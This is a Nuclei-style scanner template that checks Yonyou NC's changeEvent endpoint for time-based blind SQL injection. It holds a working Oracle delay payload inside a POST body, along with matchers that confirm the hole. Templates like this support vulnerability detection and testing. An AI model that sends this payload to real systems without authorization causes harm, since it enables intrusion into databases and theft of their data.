id: yonyou-nc-changeevent-sqli

info:
  name: 用友NC - changeEvent SQL注入漏洞
  author: onewin
  severity: high
  description: |
    用友NC系统的changeEvent接口存在SQL注入漏洞，攻击者可通过时间盲注技术获取数据库敏感信息
  reference: UFIDA-2025-059739
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud


http:
  - method: POST
    path: 
      - "{{BaseURL}}/portal/pt/oacoSchedulerEvents/changeEvent?pageId=login"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "event_id=1' AND 1=dbms_pipe.receive_message('RDS',3)--+#&startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00"
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=3 && duration<8"
          - "status_code == 500"
        condition: and
      - type: word
        words:
          - "title>Error"
        condition: and